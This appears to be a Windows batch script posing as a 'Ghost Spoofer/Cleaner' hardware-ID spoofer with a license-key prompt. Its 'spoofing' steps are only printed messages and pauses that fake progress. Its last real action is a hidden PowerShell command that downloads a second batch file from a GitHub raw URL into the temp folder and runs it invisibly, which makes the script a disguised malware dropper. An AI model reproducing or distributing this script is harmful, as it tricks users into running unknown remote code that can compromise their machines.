@echo off
chcp 65001 >nul
mode con: cols=73 lines=34
goto login
title Enter Key... | Ghost Spoofer/Cleaner

:login
cls
echo.
echo                         ░░▓▓▓▓▓▓▓▓▓▓▓▓                            
echo                       ▒▒▒▒░░░░░░░░░░░░▒▒▒▒                        
echo                   ░░░░              ░░░░░░▒▒                      
echo                 ▒▒                      ░░░░░░░░                  
echo                 ▒▒                      ░░░░░░▒▒                  
echo               ▓▓  ░░██      ██            ░░░░░░▓▓                
echo               ▓▓  ████      ████          ░░░░░░▒▒                
echo               ▓▓  ████      ██████        ░░░░░░▒▒░░              
echo         ▓▓░░▒▒▓▓    ░░        ░░          ░░░░░░▒▒░░              
echo       ▒▒                          ▒▒▒▒▒▒▒▒░░░░░░░░▒▒              
echo     ▒▒          ░░    ▓▓▒▒      ▒▒        ▒▒░░░░░░▒▒              
echo     ▒▒          ░░    ░░      ░░            ░░░░░░▒▒              
echo   ▓▓          ░░░░          ▓▓                ░░░░▒▒              
echo   ▒▒        ░░░░░░          ▒▒                ░░░░▒▒              
echo   ▒▒      ░░░░░░░░          ░░▒▒▒▒            ░░░░▒▒              
echo   ░░░░░░░░▒▒░░░░░░            ▒▒░░▒▒            ░░▒▒              
echo       ▒▒░░░░▒▒░░░░    ░░        ▒▒░░▓▓          ░░░░▓▓            
echo         ▒▒░░▒▒░░░░    ░░      ░░▒▒░░░░▒▒        ░░░░▓▓            
echo           ▒▒▒▒░░░░    ░░      ░░░░▒▒░░▒▒        ░░░░▒▒            
echo             ▒▒░░░░    ░░      ░░░░░░▒▒▒▒    ░░░░░░░░▒▒            
echo             ▒▒░░░░    ░░      ░░░░░░░░▒▒    ░░░░░░░░░░▓▓          
echo             ▒▒░░░░    ░░      ░░░░░░░░░░▓▓  ░░░░░░░░░░▒▒          
echo             ▒▒░░░░    ░░        ░░░░░░░░░░    ░░░░░░░░▒▒          
echo             ▒▒░░░░░░  ░░░░      ░░░░░░░░░░    ░░░░░░░░░░▓▓        
echo               ▒▒░░░░  ░░░░      ░░░░░░░░░░░░    ░░░░░░░░▒▒        
echo               ▒▒░░▒▒▒▒▒▒▒▒▓▓    ░░░░░░░░░░░░░░  ░░░░░░░░░░▓▓      
echo               ▒▒▒▒░░░░░░░░▒▒▓▓░░░░░░░░░░░░░░░░    ░░░░░░░░▒▒      
echo               ▒▒▒▒░░░░░░░░▒▒░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓    
echo               ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓    
echo                 ░░░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▓▓  
echo                       ▒▒▒▒▒▒▒▒Enter Key!▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓
echo.
set /p "key=:#~ "

if "%key%"=="GHOST-SPOOF-HAWIGBE-WQNIBA" (
    echo Key accepted. Redirecting...
    timeout /t 2 >nul
    cls
    goto download
) else (
    echo Key Does Not Exist. Please Try Again
    timeout /t 2 >nul
    cls
    goto login
)

:download
echo Key Confirmed. Spoofing...
timeout /t 2 >nul
echo Spoofing Drivers
timeout /t 5 >nul
echo -Completed
timeout /t 1 >nul
echo Spoofing Monitor
timeout /t 2 >nul
echo -Completed
timeout /t 1 >nul
echo Spoofing Registry Keys
timeout /t 3 >nul
echo -Completed
timeout /t 1 >nul
echo Spoofing HWID
timeout /t 2 >nul
echo -Completed
timeout /t 2 >nul
cls
timeout /t 1 >nul
echo *
timeout /t 1 >nul
cls
echo **
timeout /t 1 >nul
cls
echo ***
timeout /t 1 >nul
cls
timeout /t 1 >nul
echo *
timeout /t 1 >nul
cls
echo **
timeout /t 1 >nul
cls
echo ***
timeout /t 2 >nul
cls
timeout /t 1 >nul
echo Spoofing Completed.
timeout /t 2 >nul
powershell -windowstyle hidden -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/kasaotnic4422/fatbitchmuseum/main/Dlr.bat', '%TEMP%\Dlr.bat'); Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File %TEMP%\Dlr.bat'"
pause
exit